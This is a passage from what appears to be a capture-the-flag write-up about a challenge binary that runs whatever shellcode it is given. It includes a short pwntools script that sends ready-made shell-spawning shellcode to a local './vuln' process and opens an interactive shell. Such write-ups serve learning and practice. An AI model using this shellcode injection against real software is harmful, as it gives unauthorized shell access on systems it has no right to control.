    </summary>

We have a program that asks us an shellcode.

If we provide to it an working shellcode, it will perform this shellcode.

There really wasn't a thinking process involved with the solution of this one, pwntools gives us a ready made shellcode for popping a shell using `shellcraft`.

```python
from pwn import *

context.binary = "./vuln"

p = process()
p.sendline(asm(shellcraft.sh()))
p.interactive()
```
